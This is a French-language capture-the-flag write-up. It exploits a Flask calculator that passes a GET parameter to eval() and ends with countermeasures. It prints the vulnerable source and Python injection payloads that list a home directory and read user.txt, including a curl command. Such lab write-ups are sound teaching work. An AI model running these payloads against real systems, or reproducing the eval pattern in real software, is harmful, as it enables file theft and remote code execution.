# Récupération du flag user.txt
# Récupération du flag user.txt

## 1 / Énumération du service

Après avoir récupéré l'accès à la machine, on commence par effectuer une énumération des ports et services disponibles :

```bash
nmap -sC -sV -p- 10.10.0.2
```

On découvre notamment le port :

```text
5739/tcp open  unknown
```

Le service retourne une page web utilisant **Python**.

En accédant au service sur le port `5739`, on découvre une page indiquant que l'utilisateur doit effectuer un calcul :

```text
The year is 5739, we have to start everything from scratch !
```

La page contient notamment un champ :

```text
Calculus : [                ]
```

On teste alors une expression mathématique simple :

```text
2+2
```

Le serveur retourne :

```text
Result : 2+2 = 4
```

Cela indique que notre entrée est bien interprétée par le serveur.

---

## 2 / Identification de la vulnérabilité

En inspectant le code source de l'application, en mettant dans l'url : ```http://10.10.0.2:5739/?calc=open(%22/home/senku/app/app.py%22).read()```on obtient :

```python
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def index():
    calc = request.args.get('calc') or "24*60*60"
    
    try:
        return render_template('index.html', name=calc, calc=eval(calc))
    except:
        return render_template('index.html', name="24*60*60", calc=eval("24*60*60"))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5739)
```

La ligne particulièrement intéressante est :

```python
eval(calc)
```

La valeur de `calc` provient directement du paramètre GET :

```python
calc = request.args.get('calc')
```

L'application exécute donc directement notre entrée comme du code Python.

On dispose ainsi d'une **exécution de code Python à distance (RCE)**.

---

## 3 / Vérification de l'accès aux fonctions Python

On peut vérifier les fonctions disponibles avec :

```python
dir(__builtins__)
```

La réponse contient notamment :

```python
open
eval
exec
__import__
```

La présence de `open` est particulièrement intéressante puisqu'elle permet de lire des fichiers présents sur la machine.

On peut également utiliser `__import__` afin d'importer des modules Python, notamment `os`.

---

## 4 / Énumération du dossier de l'utilisateur

On cherche maintenant les fichiers présents dans le dossier personnel de l'utilisateur `senku` :

```text
__import__("os").listdir("/home/senku")
```

On obtient :

```text
['.bashrc', '.profile', '.bash_logout', 'user.txt', 'app']
```

La présence de :

```text
user.txt
```

confirme que le flag utilisateur se trouve dans :

```text
/home/senku/user.txt
```

---

## 5 / Récupération du flag utilisateur

On utilise la fonction Python `open()` afin de lire le contenu du fichier :

```text
open("/home/senku/user.txt").read()
```

On peut envoyer cette expression au serveur avec :

```bash
curl --get \
  --data-urlencode 'calc=open("/home/senku/user.txt").read()' \
  http://10.10.0.2:5739/
```

Le serveur exécute l'expression Python et affiche le contenu de `user.txt`.

On récupère ainsi le **flag utilisateur**.


La vulnérabilité principale de ce défi est donc l'utilisation de `eval()` sur une donnée contrôlée par l'utilisateur, permettant de transformer un simple champ de calcul en **RCE Python**.

## 6 / Contre-mesures

### Évaluation de code Python contrôlé par l'utilisateur

- Ne jamais utiliser `eval` ou `exec` sur une donnée reçue par HTTP.
- Parser uniquement les expressions mathématiques autorisées avec une bibliothèque dédiée ou un analyseur limité.
- Exécuter le service avec un compte sans accès aux fichiers sensibles, sans privilèges inutiles et dans un environnement isolé.
- Ne pas exposer les exceptions ni le code source ; surveiller les requêtes anormales et limiter la taille des entrées.
